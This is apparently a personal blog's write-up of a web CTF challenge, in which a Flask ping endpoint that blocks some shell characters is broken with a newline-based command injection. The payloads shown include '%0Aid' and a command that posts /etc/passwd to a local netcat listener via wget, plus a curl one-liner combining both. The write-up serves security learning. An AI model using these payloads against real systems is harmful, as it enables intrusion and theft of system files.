@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title>TakitoChall CYBEX [ WEB ] | H4ns&#39; blog</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="TakitoChall CYBEX [ WEB ]" />
+<meta property="og:description" content="Introduction The objective of this challenge is to get an RCE, specifically to get the output of the cat /etc/passwd command.
+from flask import Flask from flask import request from os import system app = Flask(__name__) @app.route(&#39;/&#39;) def rce(): ip = request.args.get(&#39;ip&#39;) if ip is None: return &#39;Please use ?ip=127.0.0.1&#39; for char in &#39;&amp;;|$()`&#39;: if char in ip: return &#39;Character {}is blocked&#39;.format(char) system(&#39;ping -c 1 &#39;&#43;ip) return &#39;Ping sent&#39; if __name__ == &#39;__main__&#39;: app." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/takitochall/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-02-27T18:35:38-05:00" />
+<meta property="article:modified_time" content="2022-02-27T18:35:38-05:00" />
+
+
+		<meta itemprop="name" content="TakitoChall CYBEX [ WEB ]">
+<meta itemprop="description" content="Introduction The objective of this challenge is to get an RCE, specifically to get the output of the cat /etc/passwd command.
+from flask import Flask from flask import request from os import system app = Flask(__name__) @app.route(&#39;/&#39;) def rce(): ip = request.args.get(&#39;ip&#39;) if ip is None: return &#39;Please use ?ip=127.0.0.1&#39; for char in &#39;&amp;;|$()`&#39;: if char in ip: return &#39;Character {}is blocked&#39;.format(char) system(&#39;ping -c 1 &#39;&#43;ip) return &#39;Ping sent&#39; if __name__ == &#39;__main__&#39;: app."><meta itemprop="datePublished" content="2022-02-27T18:35:38-05:00" />
+<meta itemprop="dateModified" content="2022-02-27T18:35:38-05:00" />
+<meta itemprop="wordCount" content="315">
+<meta itemprop="keywords" content="" />
+		<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TakitoChall CYBEX [ WEB ]"/>
+<meta name="twitter:description" content="Introduction The objective of this challenge is to get an RCE, specifically to get the output of the cat /etc/passwd command.
+from flask import Flask from flask import request from os import system app = Flask(__name__) @app.route(&#39;/&#39;) def rce(): ip = request.args.get(&#39;ip&#39;) if ip is None: return &#39;Please use ?ip=127.0.0.1&#39; for char in &#39;&amp;;|$()`&#39;: if char in ip: return &#39;Character {}is blocked&#39;.format(char) system(&#39;ping -c 1 &#39;&#43;ip) return &#39;Ping sent&#39; if __name__ == &#39;__main__&#39;: app."/>
+
+	<link rel="stylesheet" href="/css/bundle.css">
+	<link rel="stylesheet" href="/css/custom.css">
+	<link rel="stylesheet" href="/css/themes/dark-blue.css">
+	<link rel="icon" href="/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/icons/32.png" sizes="32x32" type="image/png">
+	<link rel="manifest" href="/manifest.json">
+		
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/">H4ns&#39; blog</a>
+	
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+<nav class="breadcrumb block" aria-label="breadcrumb">
+	<ol class="breadcrumb__list">
+		
+		<li class="breadcrumb__item">
+			<a class="breadcrumbs__link" href="/">Challs</a>
+		</li>
+		<li class="breadcrumb__item">
+			<a class="breadcrumbs__link" href="/post/">Posts</a>
+		</li>
+		<li class="breadcrumbs__item breadcrumb__item--active" aria-current="page">TakitoChall CYBEX [ WEB ]</li>
+	</ol>
+</nav>
+		<div class="single block">
+			<article class="entry">
+	<div class="entry__meta meta mb">
+	<time class="entry__meta-published meta-published" datetime="2022-02-27T18:35:38-05:00">February 27, 2022</time>
+	</div>
+				<h1 class="entry__title">TakitoChall CYBEX [ WEB ]</h1>
+<details class="entry__toc toc" open>
+	<summary class="toc__title">Table of Contents</summary>
+	<nav id="TableOfContents">
+  <ul>
+    <li><a href="#__introduction__"><strong>Introduction</strong></a></li>
+    <li><a href="#__first-sight__"><strong>First sight</strong></a></li>
+    <li><a href="#__exploitation__"><strong>Exploitation</strong></a></li>
+  </ul>
+</nav>
+</details>
+				<div class="entry__content"><h2 id="__introduction__"><strong>Introduction</strong></h2>
+<p>The objective of this challenge is to get an RCE, specifically to get the output of the <code>cat /etc/passwd</code> command.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask
+<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> request
+<span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> system
+
+app <span style="color:#f92672">=</span> Flask(__name__)
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rce</span>():
+    ip <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;ip&#39;</span>)
+
+    <span style="color:#66d9ef">if</span> ip <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Please use ?ip=127.0.0.1&#39;</span>
+
+    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;&amp;;|$()`&#39;</span>:
+        <span style="color:#66d9ef">if</span> char <span style="color:#f92672">in</span> ip:
+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Character </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> is blocked&#39;</span><span style="color:#f92672">.</span>format(char)
+
+    system(<span style="color:#e6db74">&#39;ping -c 1 &#39;</span><span style="color:#f92672">+</span>ip)
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Ping sent&#39;</span>
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    app<span style="color:#f92672">.</span>run()
+</code></pre></div><p>Before starting the analysis we can notice at a glance that a ping is performed to the address we set in the <code>ip</code> parameter.</p>
+<h2 id="__first-sight__"><strong>First sight</strong></h2>
+<p>When analyzing the code we notice that in line 14 we have several banned characters such as <code>&amp;;|$()</code> and `. This is logical since command injection payloads usually carry these characters, as we can see in the following <a href="https://github.com/payloadbox/command-injection-payload-list">link</a>.</p>
+<p>Another option we could try would be to convert them to another format such as base64, unicode, hexadecimal and various conversions that would help us achieve what we are looking for.</p>
+<h2 id="__exploitation__"><strong>Exploitation</strong></h2>
+<p>In this case we are dealing with a CRLF injection. If you want to know more about this type of web vulnerability you can do so by clicking on the following <a href="https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a">link</a> which will redirect you to the official HackTricks website which has a very good review about this bug.</p>
+<p>Once we know what we are dealing with, we can now crack the following code by typing in the <code>ip=</code> parameter the following payload:</p>
+<pre tabindex="0"><code>%0Aid
+</code></pre><p><img src="https://user-images.githubusercontent.com/88755387/154855417-06bf8edb-aff1-407d-8ded-8e92254209a0.png" alt="image"></p>
+<p><img src="https://user-images.githubusercontent.com/88755387/154855372-70dc930a-1785-4137-99f7-ccaaa5774058.png" alt="image"></p>
+<p>As we can see we have taken the output in the log which would be on the server side but what we are looking for is to print the output on the screen so that the client can view it.</p>
+<p>With the following command and raising the port 443 we can get the output to our machine:</p>
+<pre tabindex="0"><code>%0Awget --post-file=/etc/passwd 127.0.0.1:443
+</code></pre><p><img src="https://user-images.githubusercontent.com/88755387/154859783-dcaae268-dd39-4616-afbc-63b40e775a54.png" alt="image"></p>
+<p>One line payload:</p>
+<pre tabindex="0"><code>nc -lvp 443 &amp; curl 127.0.0.1:5000/?ip=%0Awget%20--post-file=/etc/passwd%20127.0.0.1:443
+</code></pre></div>
+				
+				<footer class="entry__footer">
+					
+					
+<div class="entry__share share">
+	<a class="share__link btn" title="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=%2fpost%2ftakitochall%2f" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Facebook', 'width=800,height=600,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Facebook" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M330 512V322h64l9-74h-73v-47c0-22 6-36 37-36h39V99c-7-1-30-3-57-3-57 0-95 34-95 98v54h-64v74h64v190z"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on Twitter" href="https://twitter.com/intent/tweet/?url=%2fpost%2ftakitochall%2f&amp;text=TakitoChall%20CYBEX%20%5b%20WEB%20%5d" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Twitter', 'width=800,height=450,resizable=yes,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on Reddit" href="https://www.reddit.com/submit?url=%2fpost%2ftakitochall%2f&amp;title=TakitoChall%20CYBEX%20%5b%20WEB%20%5d" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Reddit', 'width=832,height=624,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Reddit" role="img" width="32" height="32" viewBox="0 0 512 512"><path fill-rule="evenodd" d="M375 146a32 32 0 1 0-29-46l-65-13c-5-1-9 2-10 6l-22 97c-45 1-85 15-113 36a42 42 0 1 0-45 69l-1 12c0 65 74 117 166 117s166-52 166-117l-1-11a42 42 0 1 0-44-69c-28-21-67-35-111-37l19-86 58 13a32 32 0 0 0 32 29zM190 353c2-1 4 0 5 1 15 11 38 18 61 18s46-6 61-18a7 7 0 0 1 8 10c-18 14-44 21-69 21-25-1-51-7-69-21a6 6 0 0 1 3-11zm23-44a31 31 0 1 1-44-44 31 31 0 0 1 44 44zm130 0a31 31 0 1 0-44-44 31 31 0 0 0 44 44z"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on LinkedIn" href="https://www.linkedin.com/shareArticle?mini=true&url=%2fpost%2ftakitochall%2f&title=TakitoChall%20CYBEX%20%5b%20WEB%20%5d" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on LinkedIn', 'width=640,height=480,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
+	</a>
+</div>
+				</footer>
+				
+			</article>
+		</div>
+	</main>
+	
+<div class="authorbox block">
+	<div class="author">
+		<figure class="author__avatar">
+			<img class="author__img" alt="H4ns avatar" src="/img/runa.jpg" height="90" width="90">
+		</figure>
+		<div class="author__body">
+			<div class="author__name">
+				H4ns
+			</div>
+			<div class="author__bio">I&#39;m a 19 years old cybersecurity enthusiast.</div>
+		</div>
+	</div>
+</div>
+	
+
+
+
+	
+
+	</div>
+	<footer class="footer">
+<div class="footer__social social">
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="mailto:alvaromansoporteiro@gmail.com">
+			<svg class="social__icon" aria-label="Email" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M299 268l124 106c-4 4-10 7-17 7H106c-7 0-13-3-17-7l124-106 43 38 43-38zm-43 13L89 138c4-4 10-7 17-7h300c7 0 13 3 17 7L256 281zm54-23l121-105v208L310 258zM81 153l121 105L81 361V153z"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://twitter.com/h4ns21">
+			<svg class="social__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://www.instagram.com/alvarinhogz">
+			<svg class="social__icon" aria-label="Instagram" role="img" width="32" height="32" viewBox="0 0 512 512"><g fill="none" stroke-width="29"><rect height="296" rx="78" width="296" x="108" y="108"/><circle cx="256" cy="256" r="69"/></g><circle cx="343" cy="169" r="19"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://linkedin.com/in/%c3%81lvaro%20Manso%20Porteiro">
+			<svg class="social__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/h4ns21">
+			<svg class="social__icon" aria-label="Github" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
+		</a>
+</div>
+	<div class="footer__copyright">© 2022 H4ns. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+
+<script src="/js/custom.js"></script>
+</body>
+</html>
